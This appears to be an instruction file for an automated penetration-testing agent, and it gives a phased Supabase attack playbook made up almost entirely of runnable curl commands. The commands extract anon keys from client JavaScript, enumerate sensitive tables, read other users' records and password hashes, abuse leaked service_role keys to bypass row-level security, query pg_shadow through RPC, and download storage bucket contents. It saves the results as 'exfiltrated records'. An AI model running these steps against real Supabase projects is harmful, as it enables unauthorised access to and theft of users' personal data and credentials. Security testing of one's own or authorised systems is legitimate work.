---
name: tech-supabase
description: "Supabase security testing — anon key abuse, Row Level Security bypass, PostgREST direct access, service_role key exposure, real-time subscription abuse. Triggers: 'supabase', 'supabase security', 'supabase rls', 'row level security bypass', 'supabase pentest', 'postgrest security', 'supabase anon key'."
---

# Supabase Security Testing

Test Supabase projects for misconfigured RLS, anon key over-permissions, and data exposure.

## Phase 1: Extract Supabase Config

```bash
TARGET="https://TARGET"

# Find Supabase config in client JS
curl -s "$TARGET" | grep -oP 'supabaseUrl[^"]*"[^"]*"'
curl -s "$TARGET" | grep -oP 'supabaseKey[^"]*"[^"]*"'
curl -s "$TARGET" | grep -oP 'NEXT_PUBLIC_SUPABASE[^=]*=[^"]*"[^"]*"'

# Extract from JS bundle
PROJECT_REF="abcdefghijklmnop"  # 20-char ref from URL
ANON_KEY="eyJhbGciOiJIUzI1NiIs..."  # JWT anon key

SUPABASE_URL="https://${PROJECT_REF}.supabase.co"
```

## Phase 2: PostgREST Direct API Access

```bash
BASE="$SUPABASE_URL/rest/v1"
ANON="$ANON_KEY"

# List available tables (anon access)
curl -s "$BASE/" -H "apikey: $ANON" | jq 'keys[]'

# Read tables
curl -s "$BASE/users?select=*&limit=10" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" | jq .

# Try to read sensitive tables
for table in users profiles accounts admin secrets api_keys tokens payments; do
  count=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$table?select=count" \
    -H "apikey: $ANON")
  echo "$count $table"
done

# Horizontal data access (change user ID)
curl -s "$BASE/profiles?id=eq.1&select=*" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON"

# Try all records without auth
curl -s "$BASE/orders?select=*" -H "apikey: $ANON"
```

## Phase 3: RLS Bypass Techniques

```bash
# Decode JWT anon key to understand role
echo "$ANON_KEY" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Register account and test with authenticated JWT
curl -s -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $ANON" -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Password123!"}' | jq '{access_token,user}'

USER_TOKEN="eyJ..."  # access_token from above

# Test authenticated access to all tables
curl -s "$BASE/admin_users?select=*" \
  -H "apikey: $ANON" -H "Authorization: Bearer $USER_TOKEN" | jq .

# Try horizontal escalation (access other users' data)
curl -s "$BASE/profiles?user_id=eq.OTHER_USER_UUID&select=*" \
  -H "apikey: $ANON" -H "Authorization: Bearer $USER_TOKEN" | jq .

# Operator abuse in PostgREST
curl -s "$BASE/users?email=like.*&select=email,password_hash" \
  -H "apikey: $ANON" -H "Authorization: Bearer $USER_TOKEN"
```

## Phase 4: Service Role Key Abuse

```bash
# Service role key = full bypass of RLS — find in:
# - Leaked .env files
# - Git history
# - CI/CD secrets
# - Frontend JS (critical misconfiguration)

SERVICE_KEY="eyJhbGciOiJIUzI1NiIs..."

# With service key: full access bypassing all RLS
curl -s "$BASE/users?select=*" \
  -H "apikey: $SERVICE_KEY" -H "Authorization: Bearer $SERVICE_KEY" | jq .

# Execute arbitrary SQL via RPC
curl -s -X POST "$BASE/rpc/exec" \
  -H "apikey: $SERVICE_KEY" -H "Authorization: Bearer $SERVICE_KEY" \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM pg_shadow LIMIT 5"}'
```

## Phase 5: Storage Bucket Enumeration

```bash
# List storage buckets
curl -s "$SUPABASE_URL/storage/v1/bucket" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" | jq '.[].name'

# List files in public bucket
curl -s -X POST "$SUPABASE_URL/storage/v1/object/list/BUCKET_NAME" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H "Content-Type: application/json" -d '{"prefix":"","limit":100}' | jq '.[].name'

# Download public objects
curl -s "$SUPABASE_URL/storage/v1/object/public/BUCKET/FILE" -o /workspace/output/supabase-file
```

## Output

Save to `/workspace/output/`:
- `supabase-tables.txt` — accessible table list and record counts
- `supabase-data.json` — exfiltrated records
- `supabase-rls-bypass.txt` — RLS bypass evidence

## Next Phase

→ `vuln-info-disclosure` for secret file scanning
→ `tech-cloud-security` for broader AWS/GCP assessment
